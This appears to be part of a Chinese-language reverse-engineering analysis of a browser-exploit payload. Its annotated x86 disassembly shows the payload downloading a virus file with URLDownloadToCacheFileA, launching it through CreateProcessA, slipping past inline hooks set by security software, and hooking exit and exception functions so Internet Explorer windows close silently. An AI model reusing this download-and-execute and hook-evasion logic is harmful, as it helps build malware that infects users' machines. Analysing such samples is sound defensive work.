
### 主代码片段

```
004070EE   |FFD0            call    eax                                        ; (11)调用URLDownloadToCacheFileA将病毒文件下载到临时文件夹

004070F0   |8BFC            mov     edi, esp

004070F2   |8BC7            mov     eax, edi

004070F4   |83C0 08         add     eax, 8                                     ; eax=szFileName

004070F7   |3E:8A18         mov     bl, byte ptr [eax]

004070FA   |84DB            test    bl, bl

004070FC   |74 03           je      short 00407101                             ; 找字符串末尾

004070FE   |40              inc     eax

004070FF  ^|EB F6           jmp     short 004070F7

00407101   |3E:C600 22      mov     byte ptr [eax], 22                         ; 加上'"'

00407105   |33D2            xor     edx, edx

00407107   |3E:8850 01      mov     byte ptr [eax+1], dl                       ; 末尾填0

0040710B   |83EC 54         sub     esp, 54

0040710E   |33C0            xor     eax, eax

00407110   |33DB            xor     ebx, ebx

00407112   |8BCC            mov     ecx, esp

00407114   |83F8 54         cmp     eax, 54

00407117   |7D 09           jge     short 00407122

00407119   |3E:891C01       mov     dword ptr [ecx+eax], ebx                   ; 内存填0

0040711D   |83C0 04         add     eax, 4

00407120  ^|EB F2           jmp     short 00407114

00407122   |8BCC            mov     ecx, esp

00407124   |8BD9            mov     ebx, ecx

00407126   |83C3 10         add     ebx, 10

00407129   |33C0            xor     eax, eax

0040712B   |3E:C743 2C 0100>mov     dword ptr [ebx+2C], 1

00407133   |51              push    ecx

00407134   |53              push    ebx

00407135   |50              push    eax

00407136   |50              push    eax

00407137   |50              push    eax

00407138   |50              push    eax

00407139   |50              push    eax

0040713A   |50              push    eax

0040713B   |57              push    edi                                        ; cmd /c "(病毒文件路径)"

0040713C   |50              push    eax

0040713D   |E8 39030000     call    <Get_CreateProcessA>

00407142   |E8 19000000     call    <CallPassingInlineHook>                    ; (12)调用CreateProcessA运行临时文件夹中的病毒

00407147   |64:A1 04000000  mov     eax, dword ptr fs:[4]                      ; StackBase，栈底值

0040714D   |8DA0 60FFFFFF   lea     esp, dword ptr [eax-A0]                    ; 堆栈值重置

00407153   |E8 37030000     call    <Get_#101Inshdocvw>                        ; 得到shdocvw.dll中导出序号为101的函数地址

00407158   |33DB            xor     ebx, ebx

0040715A   |53              push    ebx

0040715B   |53              push    ebx

0040715C   |53              push    ebx

0040715D   |53              push    ebx

0040715E   |FFD0            call    eax                                        ; (13)call shdocvw.#101
```

********************************************************************************

### 另一部分子函数代码

#### `CallPassingInlineHook`

`; eax为函数地址，检测是否有inline hook，有则尝试绕过。`

```
00407160 >  8038 E8         cmp     byte ptr [eax], 0E8                        ; call命令的开头

00407163    8038 E9         cmp     byte ptr [eax], 0E9                        ; jmp命令的开头

00407166    75 0F           jnz     short 00407177                             ; 没有被InlineHook，直接进去

00407168    8178 05 9090909>cmp     dword ptr [eax+5], 90909090                ; 已被InlineHook，检查5字节后部分是否被nop了

0040716F    74 06           je      short 00407177                             ; 是，没有办法恢复，只能直接调用

00407171    55              push    ebp                                        ; 后面5字节完好，则直接实现前面5字节原代码

00407172    8BEC            mov     ebp, esp

00407174    8D40 05         lea     eax, dword ptr [eax+5]                     ; 跳到5字节之后执行

00407177    FFE0            jmp     eax

; 下面这段似乎没有被调用到。

00407179    E8 2EFFFFFF     call    <DoInlineHook>

0040717E    C3              retn
```

#### `InlineHook_UnhandledExceptionFilter`

`; 以call命令下方的这个命令作为替代函数，对edi指向的内存空间写入INLINE HOOK代码。`

```
0040717F >  E8 28FFFFFF     call    <DoInlineHook>
```

#### `fakeUnhandledExceptionFilter`

`; UnhandledExceptionFilter的替代函数`

```
00407184 >  B8 11010480     mov     eax, 80040111

00407189    C2 0C00         retn    0C
```

#### `InlineHook_MessageBeep`

```
0040718C >  E8 1BFFFFFF     call    <DoInlineHook>
```

#### `fakeMessageBeep`

`; 调用EnumWindows遍历所有窗口，利用回调函数关闭IE7窗口。`

```
00407191 >  33C0            xor     eax, eax

00407193    50              push    eax

00407194    54              push    esp                                        ; 传给回调函数一个指针用于写入计数

00407195    E8 54000000     call    <GetEnumProcAddress>

0040719A    50              push    eax

0040719B    E8 8B020000     call    <Get_EnumWindows>                          ; 调用EnumWindows遍历窗口

004071A0    FFD0            call    eax

004071A2    36:803C24 00    cmp     byte ptr [esp], 0                          ; 计数是否为0

004071A7    77 0A           ja      short 004071B3                             ; 不为0则Sleep（结合回调内容，这里似乎是等待自身被结束）

004071A9    E8 41020000     call    <Get_ExitProcess>

004071AE    33FF            xor     edi, edi

004071B0    57              push    edi

004071B1    FFD0            call    eax                                        ; 计数为0则直接调用ExitProcess退出进程。

004071B3    E8 FB010000     call    <Get_Sleep>

004071B8    68 FF000000     push    0FF

004071BD    FFD0            call    eax
```

#### `InlineHook_LdrShutdownThread`

```
004071BF >  E8 E8FEFFFF     call    <DoInlineHook>
```

#### `fakeLdrShutdownThread`

`; 与fakeMessageBeep差不多……`

```
004071C4 >  53              push    ebx

004071C5    57              push    edi

004071C6    56              push    esi

004071C7    33C0            xor     eax, eax

004071C9    50              push    eax

004071CA    54              push    esp

004071CB    E8 1E000000     call    <GetEnumProcAddress>

004071D0    50              push    eax

004071D1    E8 55020000     call    <Get_EnumWindows>

004071D6    FFD0            call    eax

004071D8    36:803C24 00    cmp     byte ptr [esp], 0

004071DD    77 0A           ja      short 004071E9

004071DF    E8 0B020000     call    <Get_ExitProcess>

004071E4    33FF            xor     edi, edi

004071E6    57              push    edi

004071E7    FFD0            call    eax

004071E9    58              pop     eax

004071EA    5E              pop     esi

004071EB    5F              pop     edi

004071EC    5B              pop     ebx

004071ED    C3              retn
```

#### `GetEnumProcAddress`

`; 返回EnumWindows的回调函数的地址`

```
004071EE > /EB 02           jmp     short 004071F2

004071F0   |58              pop     eax

004071F1   |C3              retn

004071F2   \E8 F9FFFFFF     call    004071F0
```

#### `EnumWindowsProc`

`; 当窗口为IE窗口时关闭之，当所属线程非当前进程时计数加1（这里我觉得是不是应该只关闭自身线程的窗口才合理呢？）。`

```
004071F7 >  56              push    esi

004071F8    57              push    edi

004071F9    83EC 08         sub     esp, 8

004071FC    8BFC            mov     edi, esp

004071FE    6A 08           push    8

00407200    57              push    edi

00407201    3E:FF77 14      push    dword ptr [edi+14]

00407205    E8 5D020000     call    <Get_GetClassNameA>

0040720A    FFD0            call    eax

0040720C    8BFC            mov     edi, esp

0040720E    68 616D6500     push    656D61

00407213    68 49454672     push    72464549

00407218    8BF4            mov     esi, esp                                   ; "IEFrame"

0040721A    B9 08000000     mov     ecx, 8

0040721F    F3:A6           repe    cmps byte ptr es:[edi], byte ptr [esi]

00407221    75 2F           jnz     short 00407252                             ; 判断窗口类名是否为IE的类名"IEFrame"，否则跳走不做操作

00407223    6A 00           push    0

00407225    3E:FF7424 20    push    dword ptr ds:[esp+20]

0040722A    E8 24020000     call    <Get_GetWindowThreadProcessId>

0040722F    FFD0            call    eax

00407231    8BF8            mov     edi, eax

00407233    E8 CB010000     call    <Get_GetCurrentThreadId>
```
